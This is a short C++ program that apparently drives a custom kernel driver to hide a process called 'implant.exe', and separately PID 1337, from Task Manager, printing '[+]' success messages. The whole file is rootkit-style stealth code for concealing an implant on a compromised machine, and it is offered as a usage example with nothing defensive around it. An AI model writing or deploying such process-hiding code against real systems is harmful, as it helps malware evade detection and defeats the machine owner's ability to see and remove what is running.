#include <cstdio>
#include <memory>
#include "../Memory/DriverInterface/driver_interface.hpp"

int main()
{
	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
		return 1;

	// Hide the currently attached process
	driver->attach( L"implant.exe" );

	if( driver->hide_process() )
		printf( "[+] Process hidden from Task Manager!\n" );

	// Or hide a specific PID
	if( driver->hide_process( 1337 ) )
		printf( "[+] PID 1337 hidden!\n" );

	return 0;
}
